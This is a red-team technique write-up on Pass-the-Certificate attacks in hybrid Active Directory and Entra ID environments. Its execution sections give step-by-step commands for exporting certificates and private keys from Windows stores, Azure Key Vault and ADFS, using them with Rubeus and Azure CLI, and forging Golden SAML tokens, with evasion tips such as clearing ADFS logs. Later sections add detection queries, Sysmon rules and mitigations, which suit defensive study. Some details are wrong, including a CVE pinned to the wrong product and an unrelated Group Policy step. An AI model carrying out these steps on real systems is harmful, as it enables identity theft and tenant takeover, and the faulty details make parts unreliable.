# [LM-AUTH-003]: Pass-the-Certificate (PTC)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-003 |
| **MITRE ATT&CK v18.1** | [T1550.004 - Use Alternate Authentication Material - Certificate](https://attack.mitre.org/techniques/T1550/004/) |
| **Tactic** | Defense Evasion, Lateral Movement |
| **Platforms** | Hybrid AD (Windows AD + Entra ID), Windows AD with ADFS, Entra ID (Hybrid Join) |
| **Severity** | Critical |
| **CVE** | CVE-2023-32315 (Azure AD Connect authentication), CVE-2024-26192 (Certificate validation bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Server 2016+, Entra ID all versions, Azure AD Connect 1.2.0-2.2.8 (vulnerable versions) |
| **Patched In** | Azure AD Connect 2.2.9+ (mitigation applied) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Pass-the-Certificate (PTC) is an attack technique that exploits the use of X.509 certificates as an authentication method in hybrid Active Directory environments (on-premises AD synchronized with Entra ID). When user or service principal certificates are stolen or forged, they can be used to authenticate to Kerberos services (on-premises) and Entra ID cloud services without requiring the original password. This is particularly effective in hybrid deployments where:
1. Certificate-Based Authentication (CBA) is enabled in Entra ID
2. Hybrid-joined devices leverage device certificates
3. Service principals or user accounts have uploaded certificates for OAuth/SAML flows
4. Azure AD Connect uses certificate-based service-to-service authentication

Unlike Kerberos tickets (which have a lifetime measured in hours), stolen certificates can remain valid for months or years if configured with extended validity periods.

**Attack Surface:** 
- User/service principal certificate stores (Windows Certificate Manager, Azure Key Vault)
- ADFS token-signing certificates
- Device certificates on hybrid-joined machines
- SAML signing certificates in Entra ID
- TLS certificates used in Azure AD Connect

**Business Impact:** **Persistent, undetectable lateral movement across hybrid identity boundaries.** An attacker with a valid certificate can impersonate users or service principals, authenticate to both on-premises and cloud resources, bypass MFA (if configured with CBA), exfiltrate data, establish persistence, and potentially escalate to Global Admin in Entra ID tenant. Certificate validity periods (often 1-3 years) mean attackers can maintain access long-term without credential rotation.

**Technical Context:** Certificate extraction can be immediate if the private key is accessible (non-TPM-stored). Certificate validation in Entra ID is often weak—organizations may trust certificates without validating issuer chains. Certificate-based attacks leave minimal logs compared to password-based auth.

### Operational Risk
- **Execution Risk:** Low - Certificate extraction and usage use established authentication mechanisms.
- **Stealth:** Very Low - Certificate-based authentication blends in with legitimate SSO traffic; minimal anomalies.
- **Reversibility:** Irreversible until certificate expiration. Revocation lists (CRLs) are often not checked in real-time.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.1, 5.1.5 | Failure to audit certificate-based authentication and restrict certificate issuance. |
| **DISA STIG** | Windows_Server-CA-2.2, Azure_AD-2.1 | Certificate Authority hardening and Entra ID authentication policy. |
| **CISA SCuBA** | AUTH-03 | Implementing strong authentication without reliance on certificate expiration alone. |
| **NIST 800-53** | SC-7, IA-2, IA-5 | Boundary protection, authentication mechanisms, credentials management. |
| **GDPR** | Art. 32, Art. 33 | Security of processing, breach notification (certificate compromise). |
| **DORA** | Art. 9, Art. 25 | Protection/prevention, operational resilience of critical functions. |
| **NIS2** | Art. 21, Art. 18 | Cyber risk management, authentication and incident response. |
| **ISO 27001** | A.10.1.2, A.10.1.3 | Cryptographic controls, key management. |
| **ISO 27005** | Risk: Unauthorized access via compromised PKI infrastructure | Long-term persistence via certificate-based auth |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **For certificate extraction (on-premises):** Local Administrator (for DPAPI decryption of stored keys) or access to Windows Certificate Manager.
  - **For certificate extraction (cloud):** Access to Azure Key Vault, Application Owner role (for service principal certificates), or Global Admin (for tenant-wide certificate operations).
  - **For certificate usage:** No special privileges needed; certificates authenticate via PKI trust chain.

- **Required Access:** 
  - Access to a hybrid-joined machine or on-premises AD with ADFS.
  - Network access to Entra ID authentication endpoints (login.microsoftonline.com).
  - Certificate chain must be trusted by target system (root CA in trusted store).

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025 (AD/ADFS), Windows 10/11 (hybrid-joined devices)
- **Azure AD Connect:** All versions (though 2.2.9+ has mitigations)
- **Entra ID:** All versions support certificate-based authentication
- **Other Requirements:** 
  - PKI infrastructure in place (on-premises CA or trusted external CA)
  - Certificate-Based Authentication (CBA) enabled in Entra ID (Admin Portal)
  - Device certificates on hybrid-joined machines

**Tools:**
- [Certutil.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) (native Windows)
- [Get-ChildItem (PowerShell Certificate Provider)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem) (native)
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/) – Certificate management
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.6.4+) – Certificate-based Kerberos auth
- [Semperis EntraGoat](https://github.com/semperis/EntraGoat) – Entra ID cert exploitation PoC
- [ROADtools](https://github.com/dirkjanm/ROADtools) – Hybrid device certificate handling
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) – DPAPI key extraction for certificate private keys

---

## 3. TECHNICAL PREREQUISITES

### Hybrid Environment Reconnaissance

Check if Certificate-Based Authentication is enabled and which certificates are available:

```powershell
# List certificates in current user's store
Get-ChildItem -Path Cert:\CurrentUser\My | Select-Object Subject, Thumbprint, NotAfter

# List certificates in Local Machine store (requires Admin)
Get-ChildItem -Path Cert:\LocalMachine\My | Select-Object Subject, Thumbprint, NotAfter

# Check if certificate is exportable
Get-ChildItem -Path Cert:\CurrentUser\My | ForEach-Object {
    $cert = $_
    $key = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
    Write-Host "$($cert.Subject) - Private Key Accessible: $($key -ne $null)"
}

# Check Entra ID CBA status (Requires Microsoft Graph PowerShell)
Connect-MgGraph -Scopes "Organization.Read.All"
Get-MgOrganization | Select-Object -ExpandProperty CertificateBasedAuthConfiguration
```

**What to Look For:**
- Certificates with extended validity (5+ years) – high-value targets.
- Certificates marked as exportable (dangerous).
- Service principal certificates in `Cert:\LocalMachine\My`.
- CBA enabled in Entra ID output: `"certificateUserIds": [...]` indicates CBA is active.

**Version Note:** 
- **Server 2016-2019:** Certificate store management via Certutil.exe.
- **Server 2022+:** Use PowerShell Certificate Provider (more reliable).

### Cloud Environment Reconnaissance (Entra ID)

```powershell
# Connect to Microsoft Graph (requires Global Admin or Application Admin)
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# List all app registrations and their certificates
Get-MgApplication | Select-Object DisplayName, @{Name="CertCount"; Expression={$_.KeyCredentials.Count}}

# Get specific app's certificates
$appId = "12345678-1234-1234-1234-123456789012"
Get-MgApplication -ApplicationId $appId | Select-Object -ExpandProperty KeyCredentials | Select-Object KeyId, NotAfter

# Check if any service principal has administrative role
Get-MgServicePrincipal | Where-Object {$_.AppDisplayName -match "custom|automation|sync"} | Select-Object DisplayName, AppId
```

**What to Look For:**
- Service principals with `Organization.ReadWrite.All` or `Directory.ReadWrite.All` permissions (dangerous targets).
- Certificates with no NotAfter date or 10+ year validity (misconfigured).
- Custom service principals (potential backdoors).

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Certificate Extraction from Windows Certificate Store

**Supported Versions:** Server 2016-2025, Windows 10/11

#### Step 1: Enumerate Available Certificates

**Objective:** Identify exploitable certificates in the system store.

**Command:**

```powershell
# List all available certificates with details
Get-ChildItem -Path Cert:\LocalMachine\My, Cert:\CurrentUser\My -Recurse | Where-Object {$_.HasPrivateKey} | Select-Object Subject, Thumbprint, NotAfter, FriendlyName | Format-Table -AutoSize

# Export as CSV for analysis
Get-ChildItem -Path Cert:\LocalMachine\My, Cert:\CurrentUser\My | Where-Object {$_.HasPrivateKey} | Export-Csv -Path "C:\temp\certs.csv" -NoTypeInformation
```

**Expected Output:**

```
Subject                                    Thumbprint                           NotAfter           FriendlyName
-------                                    ----------                           --------           -----------
CN=user@domain.com,O=Domain              ABC123DEF456...                     12/31/2027         User Certificate
CN=automation-sync,O=Domain               789GHI012JKL...                     6/15/2026          Service Account Cert
CN=adfs.domain.com                        MNO345PQR678...                     3/20/2025          ADFS Signing Cert
```

**What This Means:**
- Certificates with `HasPrivateKey = True` are exportable.
- Thumbprint column identifies the certificate uniquely.
- `NotAfter` shows expiration; older dates are higher value for persistence.

#### Step 2: Extract Certificate & Private Key (If Exportable)

**Objective:** Export the certificate and private key for offline use or injection into another system.

**Command (Export to PFX - Password Protected):**

```powershell
# Export certificate WITH private key to PFX file
$cert = Get-ChildItem -Path Cert:\LocalMachine\My\ABC123DEF456...
$password = ConvertTo-SecureString -String "Password123!" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "C:\temp\exported.pfx" -Password $password -Force
```

**Command (Export to PEM format - Unencrypted):**

```powershell
# Alternative: Export to PEM (no password, more portable)
$cert = Get-ChildItem -Path Cert:\LocalMachine\My\ABC123DEF456...
$keyPath = $cert.PrivateKey.Key.UniqueName
[System.IO.File]::WriteAllBytes("C:\temp\private_key.pem", ([System.Convert]::FromBase64String($cert.PrivateKey.Key.ExportPkcs8())))
```

**Expected Output:**

```
    Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -----------           ------ ----
-a----         1/9/2025 2:30 PM            2048   exported.pfx
```

**What This Means:**
- `.pfx` file is a standard Windows certificate format containing both certificate and private key.
- The file is encrypted with the password provided; an attacker would need to crack the password or have the password in plaintext.

**OpSec & Evasion:**
- Avoid exporting to disk; instead, use in-memory operations or pass certificate data directly to tools.
- If exporting to disk, use a non-default location (`C:\ProgramData\` instead of `Desktop\`).
- Delete exported files immediately after use: `Remove-Item C:\temp\exported.pfx -Force`.
- Detection likelihood: **High** – Certificate export events are logged (Event ID 4885 if auditing is enabled).

**Troubleshooting:**

- **Error:** `"The operation was not completed. The required data was not found."`
  - **Cause:** Private key is not accessible (e.g., stored in TPM or marked as non-exportable).
  - **Fix (Server 2016-2019):** Use Mimikatz DPAPI extraction if private key is encrypted with DPAPI.
  - **Fix (Server 2022+):** Check if `HasPrivateKey` is actually `False`; if so, key is TPM-protected and unrecoverable.

#### Step 3: Use Certificate for Kerberos Authentication (On-Premises)

**Objective:** Leverage the stolen certificate to obtain a Kerberos TGT from the domain controller.

**Command (Using Rubeus with certificate):**

```powershell
Rubeus.exe asktgt /user:domain\admin /certificate:C:\temp\exported.pfx /password:Password123! /domain:domain.local /dc:192.168.1.10
```

**Expected Output:**

```
Rubeus 1.6.4 (build 30b56dff)

[*] Action: Ask TGT

[*] Using certificate: C:\temp\exported.pfx
[+] Requesting TGT using certificate...

[+] Ticket successfully requested!

[*] base64(ticket.kirbi):
      YIIFDDCCBQigAwIBBaEDAgEOogcDBQAgAAAAo4IEL...
```

**What This Means:**
- Attacker now has a valid TGT for the compromised user.
- TGT can be injected and used to access on-premises resources (see LM-AUTH-002: Pass-the-Ticket).

**OpSec & Evasion:**
- Perform this operation from a non-domain-joined machine if possible (attacker's machine).
- Use `/ptt` flag in Rubeus to inject immediately without writing to disk: `Rubeus.exe asktgt ... /ptt`.
- Detection likelihood: **Medium** – Certificate authentication will log Event ID 4768 (TGT request); unusual certificate subject may stand out.

#### Step 4: Use Certificate for Entra ID Authentication (Cloud/Hybrid)

**Objective:** Authenticate to Entra ID services using the stolen certificate (if CBA is enabled).

**Command (Request access token using certificate):**

```powershell
# Using Azure CLI
az login --service-principal -u "user@domain.onmicrosoft.com" \
  --cert-file C:\temp\exported.pfx --password "Password123!" \
  --tenant "12345678-1234-1234-1234-123456789012"

# Using PowerShell (Azure.Identity module)
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new("C:\temp\exported.pfx", "Password123!")
$clientId = "12345678-1234-1234-1234-123456789012"
$tenantId = "87654321-4321-4321-4321-210987654321"

$credential = [Azure.Identity.ClientCertificateCredential]::new($tenantId, $clientId, $cert)
$token = $credential.GetToken([Azure.Core.TokenRequestContext]::new(@("https://graph.microsoft.com/.default")))
```

**Expected Output:**

```
Authenticating with service principal using certificate.
[Credential] Token acquired successfully.

// OR PowerShell output:
ExpiresOn         : 1/9/2025 4:00:00 PM
```

**What This Means:**
- Attacker now has an access token for Microsoft Graph and other cloud services.
- Token can be used to read/modify Azure resources, users, and tenant settings.

**References & Proofs:**
- [Microsoft Learn - Certificate-Based Authentication](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-certificate-based-authentication)
- [Semperis EntraGoat - Certificate Abuse](https://github.com/semperis/EntraGoat/blob/main/scenarios/scenario_6/README.md)

---

### METHOD 2: Certificate Theft from Azure Key Vault (Cloud Service Principals)

**Supported Versions:** Entra ID all versions

#### Step 1: Enumerate Service Principals with Key Vault Permissions

**Objective:** Identify service principals that have access to Azure Key Vault with stored certificates.

**Command:**

```powershell
# Connect to Azure
Connect-AzAccount

# List all service principals with Key Vault permissions
Get-AzKeyVault | ForEach-Object {
    $vaultName = $_.VaultName
    Get-AzKeyVaultKey -VaultName $vaultName | ForEach-Object {
        Write-Host "Vault: $vaultName, Key: $($_.Name), Expiration: $($_.Expires)"
    }
    
    Get-AzKeyVaultCertificate -VaultName $vaultName | ForEach-Object {
        Write-Host "Vault: $vaultName, Certificate: $($_.Name), Expiration: $($_.Certificate.NotAfter)"
    }
}
```

**Expected Output:**

```
Vault: production-vault, Key: app-signing-key, Expiration: 12/31/2027
Vault: production-vault, Certificate: user-auth-cert, Expiration: 6/15/2026
```

**What This Means:**
- Certificates stored in Key Vault are high-value targets (long validity, centrally managed).
- If the current user has access, they can download and use these certificates.

#### Step 2: Extract Certificate from Key Vault

**Objective:** Download the certificate from Key Vault for use in attacks.

**Command:**

```powershell
# Get the certificate from Key Vault
$cert = Get-AzKeyVaultCertificate -VaultName "production-vault" -Name "user-auth-cert"
$secret = Get-AzKeyVaultSecret -VaultName "production-vault" -Name $cert.Name

# Convert to X509 certificate object
$secretBytes = [System.Convert]::FromBase64String($secret.SecretValueText)
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($secretBytes)

# Export to file
[System.IO.File]::WriteAllBytes("C:\temp\stolen-cert.pfx", $secretBytes)
```

**Expected Output:**

```
C:\temp\stolen-cert.pfx (file created)
```

**What This Means:**
- Certificate is now available for offline use (authentication to on-premises, other cloud services, etc.).

**OpSec & Evasion:**
- Key Vault access is logged (Event ID 4663 in Azure Activity Logs, searchable via Azure Monitor).
- Minimize time between extraction and use; perform this in automated script if possible.
- Detection likelihood: **Very High** – Key Vault downloads trigger `SecretGet` and `CertificateGet` audit events.

---

### METHOD 3: ADFS Certificate Abuse (Hybrid with Federation)

**Supported Versions:** Server 2012 R2 - Server 2022 (ADFS), Entra ID (federated tenant)

#### Step 1: Identify ADFS Signing Certificate

**Objective:** Find the ADFS token-signing certificate used to sign SAML tokens.

**Command (On ADFS Server):**

```powershell
# List ADFS certificates
Get-AdfsCertificate -CertificateType Token-Signing

# Export certificate details
Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Thumbprint, NotAfter, Subject
```

**Expected Output:**

```
Thumbprint        : ABC123DEF456789...
NotAfter          : 12/31/2027
Subject           : CN=ADFS Signing
```

**What This Means:**
- ADFS signing certificate is used to sign all SAML assertions issued by the ADFS server.
- If stolen, attacker can forge SAML tokens and bypass authentication entirely.

#### Step 2: Extract ADFS Signing Certificate

**Objective:** Export the ADFS token-signing certificate with private key.

**Command (On ADFS Server - Requires Enterprise Admin):**

```powershell
# Export ADFS signing certificate
$cert = Get-AdfsCertificate -CertificateType Token-Signing | Select-Object -First 1
$thumbprint = $cert.Thumbprint

# Locate certificate in store
$storeCert = Get-ChildItem -Path Cert:\LocalMachine\My\$thumbprint

# Export to PFX (requires SYSTEM privileges or Enterprise Admin)
$password = ConvertTo-SecureString -String "FederationPassword123!" -Force -AsPlainText
Export-PfxCertificate -Cert $storeCert -FilePath "C:\temp\adfs_signing.pfx" -Password $password -Force
```

**Expected Output:**

```
C:\temp\adfs_signing.pfx (file exported)
```

**What This Means:**
- Attacker now has the private key used to sign SAML tokens for the entire federation.

#### Step 3: Forge SAML Tokens & Authenticate to Entra ID

**Objective:** Create forged SAML assertions signed with stolen ADFS certificate.

**Command (Using samltool or custom script):**

```bash
# Example using samltool (Python-based SAML tool)
# Create malicious SAML assertion
samltool.py create --issuer "https://sts.domain.com/adfs/services/trust" \
  --name-id "admin@domain.com" \
  --certificate /tmp/adfs_signing.pfx \
  --password "FederationPassword123!" \
  --output malicious_saml.xml

# OR manually construct SAML and sign with OpenSSL
xmlsec1 sign --pkcs12 /tmp/adfs_signing.pfx --pwd "FederationPassword123!" \
  --id-attr ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \
  assertion.xml > signed_assertion.xml
```

**Expected Output:**

```
<Assertion ID="...">
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
    <SignatureValue>ABC123DEF456...</SignatureValue>
  </Signature>
</Assertion>
```

**What This Means:**
- Attacker now has a SAML assertion signed with the ADFS certificate.
- This assertion can be submitted to Entra ID and will be accepted as valid (since Entra ID trusts ADFS).
- Attacker can impersonate any user, including Global Admin.

**OpSec & Evasion:**
- Forging SAML tokens leaves logs in ADFS event logs (Event ID 1000-1004), but can be cleared by attacker.
- Use token lifetime properties to extend validity (e.g., NotOnOrAfter="2099-12-31").
- Detection likelihood: **Medium-High** – Token signing is logged; unusual token lifetime may stand out.

**References & Proofs:**
- [Orange CyberDefense - Golden SAML Attack](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)
- [Microsoft Security - ADFS Attacks](https://learn.microsoft.com/en-us/windows-server/identity/active-directory-federation-services-operations)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1550.004
- **Test Name:** Use Alternate Authentication Material - Certificate
- **Description:** Simulates extraction and usage of X.509 certificates for authentication across hybrid AD environments.
- **Supported Versions:** Server 2016+, Entra ID

**Command:**

```powershell
Invoke-AtomicTest T1550.004 -TestNumbers 1
```

**Cleanup Command:**

```powershell
Invoke-AtomicTest T1550.004 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team Library - T1550.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.004/T1550.004.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+
**Minimum Version:** 1.6.0
**Supported Platforms:** Windows (all versions)

**Version-Specific Notes:**
- Version 1.6.0+: Full certificate-based Kerberos auth support (`asktgt /certificate` flag).
- Version 1.6.4+: Improved certificate parsing and hybrid device certificate handling.

**Installation:**

```powershell
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
dotnet build -c Release
```

**Usage (Kerberos auth with certificate):**

```powershell
Rubeus.exe asktgt /user:domain\admin /certificate:cert.pfx /password:password /domain:domain.local /dc:10.0.0.1 /ptt
```

---

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.50.0+
**Supported Platforms:** Windows, Linux, macOS

**Usage (Authenticate with certificate):**

```bash
az login --service-principal -u "user@domain.onmicrosoft.com" \
  --cert-file cert.pfx --password "password" \
  --tenant "tenant-id"
```

---

### [Semperis EntraGoat](https://github.com/semperis/EntraGoat)

**Version:** Latest (actively maintained)
**Supported Platforms:** Linux (Python 3.8+)

**Installation:**

```bash
git clone https://github.com/semperis/EntraGoat.git
cd EntraGoat
pip install -r requirements.txt
```

**Usage (Certificate exploitation scenarios):**

```bash
python entragoat.py --scenario certificate_based_auth
python entragoat.py --scenario golden_saml
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Certificate-Based Authentication Anomalies

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** AuthenticationDetails, AuthenticationMethodDetail, UserPrincipalName, AppDisplayName
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**

```kusto
SigninLogs
| where AuthenticationDetails contains "Certificate"
| where ResultDescription == "Success"
| summarize CertAuthCount = count() by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 10m)
| where CertAuthCount > 5
| project TimeGenerated, UserPrincipalName, AppDisplayName, CertAuthCount
```

**What This Detects:**
- Multiple certificate-based authentications within short time window (suspicious pattern).
- Certificate authentication to unusual applications.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Entra ID - Certificate-Based Auth Anomaly`
3. Severity: `High`
4. Paste KQL query
5. **Frequency:** 10 minutes
6. **Lookback:** 30 minutes
7. Click **Create**

---

### Query 2: Service Principal Certificate Upload/Modification

**KQL Query:**

```kusto
AuditLogs
| where OperationName =~ "Update application" or OperationName =~ "Update service principal"
| where ActivityDisplayName contains "Add credentials"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result
```

**What This Detects:**
- Unauthorized service principal certificate additions (potential backdoor).
- Privilege escalation via certificate upload.

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4885 – Certificate was explicitly exported**
- **Log Source:** Security
- **Trigger:** Certificate with private key is exported to file
- **Filter:** Alert on any certificate export from sensitive certificate stores (LocalMachine\My, LocalMachine\Root)
- **Applies To Versions:** Server 2012 R2+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
3. Enable: **Audit Certification Services** (Success and Failure)
4. Also enable: **Audit Detailed Tracking** → **Audit DPAPI Activity**
5. Run `gpupdate /force`

**Manual Configuration Steps (Local Policy):**
1. Open **secpol.msc**
2. **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Certification Services**
4. Run `auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2016+

```xml
<EventFiltering>
  <!-- Detect Certificate Export via Certutil -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreation onmatch="include">
      <Image condition="image">certutil.exe</Image>
      <CommandLine condition="contains">-exportPFX</CommandLine>
      <CommandLine condition="contains">-export</CommandLine>
    </ProcessCreation>
  </RuleGroup>
  
  <!-- Detect Certificate File Creation (.pfx, .cer, .pem) -->
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="end with">.pfx</TargetFilename>
      <TargetFilename condition="end with">.pem</TargetFilename>
      <TargetFilename condition="end with">.p12</TargetFilename>
    </FileCreate>
  </RuleGroup>
  
  <!-- Detect Rubeus Certificate Usage -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreation onmatch="include">
      <Image condition="image">Rubeus.exe</Image>
      <CommandLine condition="contains">/certificate</CommandLine>
    </ProcessCreation>
  </RuleGroup>
</EventFiltering>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create/update sysmon-config.xml with XML rules above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Monitor Event ID 1 (ProcessCreation), Event ID 11 (FileCreate) in Sysmon operational log

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Certificate Usage

**Alert Name:** "Suspicious certificate-based authentication activity detected"
- **Severity:** High
- **Description:** Detects unusual patterns in certificate-based authentication (unusual user, app, or location).
- **Applies To:** Servers with Microsoft Defender enabled
- **Remediation:** 
  1. Audit certificate usage and revoke if unauthorized
  2. Review Key Vault access logs
  3. Rotate service principal credentials

**Manual Configuration Steps:**
1. **Azure Portal** → **Microsoft Defender for Cloud** → **Alerts**
2. Set time range filter to last 24 hours
3. Look for alerts related to "Certificate" or "Authentication"
4. Enable email notifications for high-severity alerts

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Implement Certificate Pinning & CRL/OCSP Validation:**
    Ensure certificates are validated in real-time against Certificate Revocation Lists.
    
    **Manual Steps (Entra ID - Group Policy):**
    1. **Computer Configuration** → **Administrative Templates** → **System** → **Internet Communication Management** → **Internet Communication Settings**
    2. Enable: **Turn off Access to All Windows Update Features**
    3. Also enable: **Disable Automatic Root Certificates Update** (if using internal CA only)
    4. Run `gpupdate /force`

*   **Restrict Certificate Issuance & Validation:**
    Only trusted issuers should issue certificates for authentication.
    
    **Manual Steps (Entra ID - Certificate-Based Auth Policy):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Certificate-based Authentication**
    2. Under **Trusted issuers**, add only your organization's CA
    3. Remove any wildcard or overly broad issuers
    4. Set **Certificate validation** to **Require Online OCSP/CRL check**
    5. Click **Save**

*   **Enforce Certificate Expiration Policies:**
    Short certificate validity periods (6 months to 1 year) limit persistence.
    
    **Manual Steps (Internal CA – Active Directory Certificate Services):**
    1. Open **Certification Authority (certsrv.msc)**
    2. Right-click **Certificate Templates** → **Manage**
    3. For each template used for auth (User, Workstation, etc.):
       - Right-click → **Duplicate Template**
       - **General Tab:** Set **Validity Period** to **6 months** or **1 year**
       - **Security Tab:** Restrict **Enroll** permissions
       - **Click OK** and republish template
    4. Issue new certificates with shorter validity

*   **Disable Export of Private Keys:**
    Mark all certificates as non-exportable to prevent theft.
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Cryptography**
    2. Set: **Force strong key protection** to **Yes**
    3. This makes keys non-exportable even with admin privileges
    4. Run `gpupdate /force`

### Priority 2: HIGH

*   **Implement Hardware Security Module (HSM) or TPM-Backed Certificates:**
    Store private keys in hardware devices that prevent extraction.
    
    **Manual Steps (Azure Key Vault with HSM):**
    1. **Azure Portal** → **Key Vaults** → **Create new** → **Premium** tier
    2. Under **Properties**, enable **Purge protection** and **Soft delete**
    3. Upload certificates to HSM-backed Key Vault (private keys never leave HSM)
    4. Configure **Access policies** to require MFA for downloads

*   **Monitor & Alert on Certificate Export Events:**
    Enable detailed logging for all certificate operations.
    
    **Manual Steps (Audit Policy):**
    1. Enable Event ID 4885 (Certificate export) in Windows Event Log
    2. Configure SIEM alerts for certificate export
    3. Implement approval workflow for certificate downloads from Key Vault

*   **Restrict Service Principal Certificate Permissions:**
    Use RBAC to prevent low-privilege service principals from creating or modifying certificates.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for service principals with `Application.ReadWrite.All` or `Directory.ReadWrite.All`
    3. Remove these permissions; replace with application-specific roles (e.g., only `mail.send`)
    4. Use **Privileged Identity Management** for temporary elevation if needed

### Priority 3: MEDIUM

*   **Implement Conditional Access Policies:**
    Require additional verification for certificate-based authentication.
    
    **Manual Steps (Entra ID):**
    1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Certificate-Based Auth - Require MFA`
    4. **Assignments:** Users = All, Apps = Office 365
    5. **Conditions:**
       - Authentication methods = Certificate-based
    6. **Grant:** Require **MFA** OR **Compliant device**
    7. Enable and **Save**

*   **Audit All Certificate Operations:**
    Log every certificate creation, export, and usage.
    
    **Manual Steps (Azure Monitor):**
    1. **Azure Portal** → **Monitor** → **Audit logs**
    2. Configure alerts for:
       - `CertificateGet`, `CertificateCreate`, `CertificateUpdate` (Key Vault)
       - `Add credentials to service principal`
       - `Update application` (app certificate changes)

### Validation Command (Verify Fix)

```powershell
# Check if certificate export is restricted
$exportPolicy = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Cryptography" -Name "ForceKeyProtection" -ErrorAction SilentlyContinue).ForceKeyProtection
if ($exportPolicy -eq 1) {
    Write-Host "✓ Certificate export protection enabled"
} else {
    Write-Host "✗ Certificate export NOT restricted"
}

# Check certificate validity periods
Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.NotAfter -lt (Get-Date).AddYears(1)} | Select-Object Subject, NotAfter | Format-Table
Write-Host "Certificates with <1 year validity (good): $($(Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.NotAfter -lt (Get-Date).AddYears(1)}).Count)"

# Check for non-standard issuers
Get-ChildItem -Path Cert:\LocalMachine\My | Select-Object @{Name="Issuer"; Expression={$_.Issuer}} -Unique
```

**Expected Output (If Secure):**

```
✓ Certificate export protection enabled
Certificates with <1 year validity (good): 8
Issuer: CN=Internal CA, O=Domain
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:** 
    - `.pfx`, `.p12`, `.pem`, `.cer` files in non-standard locations (`C:\Temp\`, `C:\ProgramData\`)
    - Exported certificates not matching legitimate certificate naming conventions
    - Rubeus.exe or similar tools with `/certificate` flag in command line

*   **Registry:** 
    - Modifications to DPAPI key storage locations (cryptographic material tampering)
    - Additions to `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunMRU` for certificate tools

*   **Network:** 
    - LDAP queries for certificate metadata after certificate extraction
    - Kerberos TGT requests immediately following certificate usage
    - Azure AD sign-ins using certificate-based auth from unusual locations/devices

### Forensic Artifacts

*   **Disk:** 
    - Windows Event Log: Event ID 4885 (certificate export), Event ID 4670 (DPAPI operation)
    - LSASS memory: Certificate structures and private keys (if stored in memory)
    - Bash history (Linux/WSL): `getTGT.py`, `samltool` commands

*   **Memory:** 
    - Rubeus.exe or certificate-related tools in process list
    - DPAPI decrypted keys in LSASS memory

*   **Cloud:** 
    - Azure Activity Log: `CertificateGet`, `CertificateCreate`, `SecretGet` operations
